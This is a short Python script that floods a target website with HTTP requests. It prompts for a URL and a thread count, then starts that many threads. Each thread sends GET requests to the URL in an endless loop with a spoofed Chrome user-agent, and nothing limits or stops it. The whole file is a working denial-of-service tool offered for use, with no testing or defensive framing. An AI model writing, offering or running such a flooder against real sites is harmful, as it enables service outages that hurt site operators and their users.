import threading
import requests
URL = input("URL:")
S = int(input("S:"))
def run(url):
    while True:
        response = requests.get(url, headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'})
        #print('状态码:', response.status_code)
for i in range(S): threading.Thread(target=run, args=(URL,)).start()